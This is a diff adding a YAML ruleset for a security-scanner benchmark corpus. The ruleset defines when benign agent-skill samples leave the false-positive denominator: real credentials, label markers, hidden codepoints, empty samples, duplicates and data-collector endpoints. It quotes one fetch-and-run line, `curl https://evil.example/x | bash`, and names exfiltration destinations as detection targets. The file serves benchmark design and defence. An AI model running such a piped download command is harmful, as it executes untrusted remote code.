@@ -1,0 +1,191 @@
+# SPDX-License-Identifier: MIT
+#
+# `refutation` — the closed set of patterns that DISQUALIFY a sample from the benign
+# denominator.
+#
+# 3,241 benign samples cannot each be proven harmless. What can be done, mechanically and
+# over all of them, is to search for a small set of things whose presence means the sample is
+# not fit to serve as a false-positive denominator. A benign label then stops meaning "nobody
+# looked" and starts meaning "searched with this ruleset, at this version, zero matches" —
+# and the two become distinguishable in the data.
+#
+# =======================================================================================
+# THE TRAP THIS FILE MUST NOT FALL INTO
+#
+# If this became a set of "suspicious content" patterns, the corpus would be defining truth
+# with its own scanner. Every scanner resembling these rules would score well and every
+# scanner that works differently would score badly, and the number produced would measure
+# agreement with us rather than detection. That is the single most damaging thing that could
+# happen to a tool-neutral corpus, and it would not look like a defect from inside.
+#
+# The guard against it is the target hit rate. An audit read 250 benign samples: 97 of them
+# (39%) contain something a defensible scanner would fire on — install pipelines, example
+# secrets, `bypassPermissions`, an agent-directed imperative in Electron's own repository.
+# EVERY ONE OF THOSE 97 MUST STAY IN THE DENOMINATOR. They are the precision test. Exactly
+# one sample of the 250 was genuinely unfit.
+#
+#   Target hit rate: about 1%. If a change to this file pushes it toward 39%, the change has
+#   turned this into a scanner and must be reverted rather than tuned.
+#
+# So the question each pattern answers is NOT "would a scanner alert here?" It is: "is this
+# sample, as an object, unfit to be counted?" A sample a scanner alerts on is working as
+# intended. A sample containing a real credential, or its own answer key, is not.
+#
+# =======================================================================================
+# A MATCH IS NOT A VERDICT
+#
+# Matching does not make a sample malicious and never reclassifies anything. It routes the
+# sample to one of the `on_match` actions below, each of which ends in a human decision that
+# gets written down. Nothing here silently removes a sample from a denominator: an exclusion
+# without a recorded reason is how a corpus quietly starts flattering itself.
+#
+# Changing this file changes every denominator computed against it, so `version` is part of
+# each sample's `refutation_search` record. A rate measured under v1 and a rate measured
+# under v2 are not comparable and must not be plotted on the same axis.
+
+version: 1
+
+on_match_actions:
+  - id: exclude_from_denominator
+    what: >-
+      The sample stays in the corpus and stops being counted in the affected denominator,
+      by name, with the reason recorded next to the exclusion.
+  - id: adjudicate
+    what: >-
+      A person decides and records the decision in the manifest. Until that record exists,
+      validation fails. An unadjudicated match must never age into a silent pass.
+  - id: strip_and_declare
+    what: >-
+      The offending bytes are removed during materialisation under a declared transform
+      naming the pattern, the count and the reason, so anyone can reproduce our bytes from
+      the upstream's.
+
+patterns:
+  - id: live-credential
+    what: >-
+      A credential that would actually authenticate something: a password set by the author,
+      a real token, a private key. Its presence means a secret scanner alerting here is
+      RIGHT, so charging it a false positive inverts the measurement.
+    not: >-
+      NOT a placeholder, and this is the distinction the whole pattern turns on. The deciding
+      element is whether the value could be USED. `YOUR_PASSWORD`, `sk-xxxxxxxx`, `${VAR}`,
+      `GOCSPX-xxx`, `re_xxxxxxxxxxxxxxxx` and AWS's own documentation key
+      `AKIAIOSFODNN7EXAMPLE` are all placeholders and all STAY — a scanner that fires on them
+      is producing a false positive and that is precisely what we are measuring. The one real
+      instance found in 250 samples was `password: datpt`, which carries no vendor prefix and
+      no token shape, which is exactly why automated review missed it and a reader did not.
+    signal: >-
+      Vendor-prefixed token shapes, private-key headers, and assignments to password/secret
+      keys whose value is not a placeholder. The last case cannot be decided by regex alone.
+    on_match: adjudicate
+    expected_rate: "<0.5%"
+
+  - id: label-bearing-marker
+    what: >-
+      The sample's own content carries its label: a marker string, a sidecar field copied
+      inline, a comment naming the class or tier the upstream assigned. One substring then
+      separates the classes without reading the artifact, and any statistical detector learns
+      it in preference to the attack.
+    not: >-
+      NOT a sample that describes attacks, which is a different thing entirely. A security
+      training document quoting `curl https://evil.example/x | bash` as prose is content ABOUT
+      risk and stays. The deciding element is whether the string describes the SAMPLE'S LABEL
+      rather than its behaviour — a marker that correlates with the class while being
+      semantically unrelated to what the artifact does.
+    signal: >-
+      Per population, substrings and token prefixes with support >= 8 whose class purity
+      exceeds the ceiling. Substring level is mandatory: the known instance appends a unique
+      per-sample suffix, so every full token has support 1 and token-level scanning misses it
+      entirely while the shared prefix has support 10.
+    on_match: strip_and_declare
+    expected_rate: "0% after the known instance is cleared"
+
+  - id: hidden-codepoint
+    what: >-
+      Zero-width, bidirectional-override or tag characters positioned so that rendered text
+      differs from the bytes an agent reads.
+    not: >-
+      NOT any non-ASCII, and not every occurrence of the codepoints themselves. The deciding
+      element is whether the codepoint changes what a reader sees versus what is parsed. An
+      audit sweep over 376 files found exactly one U+200D, inside the sequence
+      U+1F9DC U+200D U+2642 U+FE0F — the merman emoji, where a zero-width joiner is doing its
+      ordinary job. CJK text, Portuguese diacritics, box drawing and emoji all stay.
+    signal: >-
+      Zero-width and bidi codepoints outside a valid emoji ZWJ sequence; tag characters
+      anywhere; mixed-script tokens inside otherwise-ASCII identifiers.
+    on_match: adjudicate
+    expected_rate: "<0.1%"
+
+  - id: no-judgeable-content
+    what: >-
+      The sample tree holds nothing that can be judged: an empty tree, or a file whose entire
+      content is a path, a stub, or a single repeated line. It occupies a slot in the
+      denominator and tests nothing.
+    not: >-
+      NOT merely short. A four-line skill that does one thing is a perfectly good sample. The
+      deciding element is whether there is anything a scanner could form a judgement ABOUT.
+      Two known instances: a 48-byte SKILL.md whose whole content is
+      `../../../product-team/product-discovery/SKILL.md` — an upstream symlink captured as
+      text, which additionally draws a traversal alert while testing nothing — and a
+      60,444-byte file that is one sentence repeated 900 times.
+    signal: >-
+      Tree with no regular files; or content that is a single filesystem path; or a distinct
+      non-blank line count in the low single digits across the whole tree.
+    on_match: exclude_from_denominator
+    expected_rate: "<0.2%"
+
+  - id: unresolvable-referent
+    what: >-
+      The sample's behaviour turns on a file the upstream itself does not ship. The vendoring
+      is faithful and the artifact still cannot be judged, by anyone, because the thing it
+      depends on is not readable.
+    not: >-
+      NOT a sample that merely mentions a script. A skill documenting `npm install` is
+      judgeable on what it instructs. The deciding element is whether the DECIDING BEHAVIOUR
+      lives in the absent file — if the answer to "is this risky" is "depends what that script
+      does", the sample cannot carry a verdict. Three known instances.
+    signal: >-
+      A label whose evidence or `differs_by` names a path absent from the sample tree.
+    on_match: exclude_from_denominator
+    expected_rate: "<0.2%"
+
+  - id: known-collector-endpoint
+    what: >-
+      A destination whose purpose is to receive data from strangers: paste sites, webhook
+      collectors, request-capture services, tunnels to an unnamed host.
+    not: >-
+      NOT any third-party endpoint, which would disqualify most of the corpus and destroy the
+      denominator. The deciding element is whether the endpoint is a NAMED SERVICE THE SAMPLE
+      LEGITIMATELY USES. An audit inventoried every endpoint in 120 samples: the substantive
+      ones were a vendor's own model API carrying its own key, an author's homelab address, a
+      framework starter host. All stay. Zero paste sites, collectors or tunnels were found,
+      so this pattern currently matches nothing and exists to catch what arrives later.
+    signal: >-
+      Hostnames on the collector list; raw IP literals as an exfiltration destination; tunnel
+      provider domains.
+    on_match: adjudicate
+    expected_rate: "0% currently"
+
+  - id: duplicate-or-contained
+    what: >-
+      The sample's bytes are identical to, or wholly contained in, another sample. The
+      denominator counts it twice and the repeated content gets double weight in the rate.
+    not: >-
+      NOT two samples that resemble each other, and not two skills doing the same job.
+      The deciding element is byte identity of the file set. Measured over all 3,494 trees:
+      5 exact-duplicate groups covering 10 samples, and 7 samples strictly contained in
+      another. One containment crosses populations — the same author's skill collected
+      independently by two upstreams — which matters because the reporting design treats
+      populations as independent strata.
+    signal: >-
+      Equal or subset file-content hash sets across sample trees.
+    on_match: exclude_from_denominator
+    expected_rate: "~0.5%"
+
+# What a benign sample records after the search runs. Written by tooling, not by hand, and
+# `ruleset_version` is mandatory: a benign rate is only meaningful alongside the version of
+# the ruleset that failed to refute it.
+search_record_shape:
+  ruleset_version: "integer, must equal this file's version"
+  matched: "list of pattern ids, empty when nothing matched"
+  scanned_bytes: "integer, so an empty tree cannot masquerade as a clean one"
